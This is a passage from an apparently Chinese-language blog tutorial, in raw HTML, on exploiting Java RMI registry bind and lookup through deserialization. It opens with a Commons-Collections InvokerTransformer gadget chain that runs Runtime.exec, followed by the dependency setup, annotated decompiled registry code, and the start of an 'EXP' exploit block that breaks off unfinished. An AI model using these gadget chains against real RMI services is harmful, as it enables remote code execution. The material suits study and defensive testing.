</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">}),</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">transformers</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">hashMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;value&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">hashMap</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">transformedMap</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">o</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>首先导入 commons-collections 3.2.1</p>
<div class="code-block-container" id="code-1769750397375254000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397375254000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397375254000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397375254000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397375254000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;groupId&gt;</span>commons-collections<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;artifactId&gt;</span>commons-collections<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;version&gt;</span>3.2.1<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><strong>需要注意，服务端和攻击端的项目应一致——都是 maven ，否则攻击无效；如果不在一个项目，都要添加 commons-collections 依赖。</strong></p>
<p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250809034.png" style="max-width: 100%; height: auto;"></p>
<p>rebind  和 bind 一样，不再赘述。</p>
<h4 id="412-lookupunbind">4.1.2 lookup&amp;unbind<a hidden class="anchor" aria-hidden="true" href="#412-lookupunbind">#</a></h4>
<div class="code-block-container" id="code-1769750397375254000" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397375254000">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397375254000" title="Toggle" aria-expanded="false" aria-controls="code-1769750397375254000" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397375254000-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">case</span><span class="w"> </span><span class="n">2</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">var98</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var104</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//读取输入流传来的 var98 并反序列化，这里对应的应该是 lookup 参数</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var98</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="n">var104</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var89</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var89</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var90</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var90</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var2</span><span class="p">.</span><span class="na">releaseInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//这里调用注册表查找对象，返回 Remote 类型并放在 var101</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="n">Remote</span><span class="w"> </span><span class="n">var101</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var6</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="n">var98</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getResultStream</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">var9</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var101</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var88</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var88</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103446.png" style="max-width: 100%; height: auto;"></p>
<p>lookup 只能传入一个 String 类型</p>
<p>分析 lookup 的功能，然后伪造 lookup 代码，达到目的：</p>
<div class="code-block-container" id="code-1769750397378129200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397378129200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397378129200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397378129200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397378129200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Remote</span><span class="w"> </span><span class="nf">lookup</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">AccessException</span><span class="p">,</span><span class="w"> </span><span class="n">NotBoundException</span><span class="p">,</span><span class="w"> </span><span class="n">RemoteException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//newCll 构造远程调用对象</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">RemoteCall</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">newCall</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="n">operations</span><span class="p">,</span><span class="w"> </span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">4905912898345647071L</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="c1">//序列化lookup 传入的输入流</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getOutputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var3</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var18</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">MarshalException</span><span class="p">(</span><span class="s">&#34;error marshalling arguments&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var18</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">//把上面序列化后的调用真正发往远端、执行远端方法。此处是把 lookup(var1) 请求发送到 RMI 服务器端并等待响应。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Remote</span><span class="w"> </span><span class="n">var23</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ObjectInput</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var2</span><span class="p">.</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">var23</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Remote</span><span class="p">)</span><span class="n">var6</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var15</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var15</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="n">var16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">UnmarshalException</span><span class="p">(</span><span class="s">&#34;error unmarshalling return&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var16</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">finally</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kd">super</span><span class="p">.</span><span class="na">ref</span><span class="p">.</span><span class="na">done</span><span class="p">(</span><span class="n">var2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">var23</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p><img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103011.png" style="max-width: 100%; height: auto;"></p>
<p>调用 invoke 后就到了客户端请求注册中心的流程：<img decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103562.png" style="max-width: 100%; height: auto;"></p>
<h5 id="exp-1">EXP：<a hidden class="anchor" aria-hidden="true" href="#exp-1">#</a></h5>
<p>在 bind 的基础上修改：</p>
<div class="code-block-container" id="code-1769750397386005200" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397386005200">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397386005200" title="Toggle" aria-expanded="false" aria-controls="code-1769750397386005200" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397386005200-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
